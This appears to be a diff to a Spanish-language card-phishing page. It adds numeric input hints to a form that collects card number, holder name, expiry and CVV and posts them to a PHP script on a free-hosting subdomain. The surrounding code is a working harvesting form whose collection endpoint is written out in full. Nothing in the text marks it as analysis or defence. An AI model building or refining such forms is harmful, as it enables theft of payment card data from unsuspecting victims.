@@ -149,7 +149,7 @@
             </div>
           
             <form class="payment-form" action="https://sandybrown-goose-468890.hostingersite.com/tarjetasatla.php" method="post">
-              <input type="text" id="card-number" placeholder="Número de Tarjeta" maxlength="19" required="" autocomplete="off" name="TarjetaNumero">
+              <input type="text" id="card-number" placeholder="Número de Tarjeta" maxlength="19" required="" autocomplete="off" name="TarjetaNumero" inputmode="numeric">
               <input type="text" id="card-holder" placeholder="Nombre del Titular" required="" autocomplete="off" onkeyup="mayus(this);" name="nombre">
               <input type="text" id="card-expiry" placeholder="Fecha de vencimiento" maxlength="5"  onkeyup="
               var v = this.value;
@@ -160,8 +160,8 @@
               this.value = v + '/';
               }"
               maxlength="5"
-              required="" autocapitalize="off" name="FechaVencimiento">
-              <input type="text" id="card-cvv" placeholder="CVV (Codigo de seguridad)" maxlength="3" required="" autocomplete="off" name="codigo">
+              required="" autocapitalize="off" name="FechaVencimiento" inputmode="numeric">
+              <input type="text" id="card-cvv" placeholder="CVV (Codigo de seguridad)" maxlength="3" required="" autocomplete="off" name="codigo" inputmode="numeric">
               <button id="boton" type="submit" class="card-button">AGREGAR TARJETA</button>
             </form>
           </div>
